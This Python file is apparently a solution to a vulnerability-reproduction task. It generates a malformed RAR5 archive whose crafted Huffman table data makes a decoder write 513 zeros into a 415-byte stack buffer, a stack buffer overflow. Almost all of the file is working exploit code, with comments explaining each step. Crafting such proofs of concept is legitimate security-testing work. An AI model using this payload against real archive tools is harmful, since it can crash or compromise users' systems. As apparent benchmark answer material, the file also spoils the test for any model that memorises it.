import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball (unused)

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        class _BitStream:
            """A helper class to write bit-level data to a byte stream."""
            def __init__(self):
                self.data = bytearray()
                self.current_byte = 0
                self.bit_pos = 0

            def write(self, value: int, num_bits: int):
                """Write the lower `num_bits` of `value` to the stream, LSB first."""
                for i in range(num_bits):
                    bit = (value >> i) & 1
                    if bit:
                        self.current_byte |= (1 << self.bit_pos)
                    self.bit_pos += 1
                    if self.bit_pos == 8:
                        self.data.append(self.current_byte)
                        self.current_byte = 0
                        self.bit_pos = 0

            def get_bytes(self) -> bytes:
                """Return the accumulated bytes, flushing any remaining bits."""
                if self.bit_pos > 0:
                    self.data.append(self.current_byte)
                return bytes(self.data)

        def _to_vint(n: int) -> bytes:
            """Encode an integer into RAR5's variable-length integer format (VINT)."""
            if n == 0:
                return b'\x00'
            res = bytearray()
            while n > 0:
                b = n & 0x7f
                n >>= 7
                if n > 0:
                    b |= 0x80
                res.append(b)
            return bytes(res)

        def _make_block(type_id: int, flags: int, data_size_vint: bytes = b'', body: bytes = b'') -> bytes:
            """Construct a complete RAR5 block with CRC, size, and data."""
            header_core = _to_vint(type_id) + _to_vint(flags) + data_size_vint + body

            # The header size VINT depends on its own length, so we calculate it iteratively.
            size_val = len(header_core)
            size_vint_len = 1
            while True:
                total_header_data_size = size_val + size_vint_len
                new_size_vint_len = len(_to_vint(total_header_data_size))
                if new_size_vint_len == size_vint_len:
                    header_size_vint = _to_vint(total_header_data_size)
                    break
                size_vint_len = new_size_vint_len
            
            header_data = header_size_vint + header_core
            crc = struct.pack('<I', zlib.crc32(header_data))
            return crc + header_data

        # 1. Craft the malicious compressed data payload
        stream = _BitStream()
        
        # Craft a Huffman pre-table. This table is used to decode the lengths
        # of the main Huffman tables. We define a simple pre-table where symbol 0
        # (a literal length) and symbol 18 (a large run of zeros) have short,
        # 1-bit codes.
        # Symbols 0-19 lengths (MC20), 4 bits each.
        pre_table_lens = [0] * 20
        pre_table_lens[0] = 1   # Symbol 0 will be encoded by bit '0'
        pre_table_lens[18] = 1  # Symbol 18 will be encoded by bit '1'
        for length in pre_table_lens:
            stream.write(length, 4)

        # The vulnerability is a stack buffer overflow when decoding the main
        # table lengths into a buffer of size 415 (NC+DC+RC+LDC).
        # We fill the buffer almost to the end (414 elements) with zeros,
        # using our 1-bit code for symbol 0.
        for _ in range(414):
            stream.write(0, 1)

        # Now, trigger the overflow. We write the code for symbol 18.
        stream.write(1, 1)

        # The parser, upon seeing symbol 18, reads 8 bits for a repeat count.
        # The number of zeros to write is `GetBits(8) + 258`.
        # We provide the maximum value, 255, resulting in 255 + 258 = 513 zeros.
        stream.write(255, 8)
        
        # This will cause a write of 513 bytes into the 415-byte buffer,
        # starting at index 414, causing a large overflow.
        compressed_bitstream = stream.get_bytes()
        
        # The compressed data block for a file starts with a pack header byte.
        # 0x40 (PFL_PACK_TABLE) indicates that Huffman tables are present.
        compressed_data = b'\x40' + compressed_bitstream

        # 2. Assemble the full RAR5 archive
        
        # RAR5 file signature
        poc = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        # Main Archive Header (minimal, but good practice)
        poc += _make_block(type_id=1, flags=0)

        # File Header for the malicious file
        file_flags = 0x0001 | 0x0002  # HFL_DATA | HFL_UNPSIZE_PRESENT
        data_size_vint = _to_vint(len(compressed_data))
        
        file_body = b''
        file_body += _to_vint(1)  # Unpacked size (dummy)
        file_body += _to_vint(0x20)  # File attributes
        file_body += _to_vint((50 << 7) | 3)  # Compression info (v5.0, method 3)
        file_body += _to_vint(2)  # Host OS (Unix)
        file_name = b'a'
        file_body += _to_vint(len(file_name)) + file_name
        
        poc += _make_block(type_id=2, flags=file_flags, data_size_vint=data_size_vint, body=file_body)

        # The malicious compressed data itself
        poc += compressed_data

        # End of Archive Header to make it a well-formed archive
        poc += _make_block(type_id=5, flags=0)

        return poc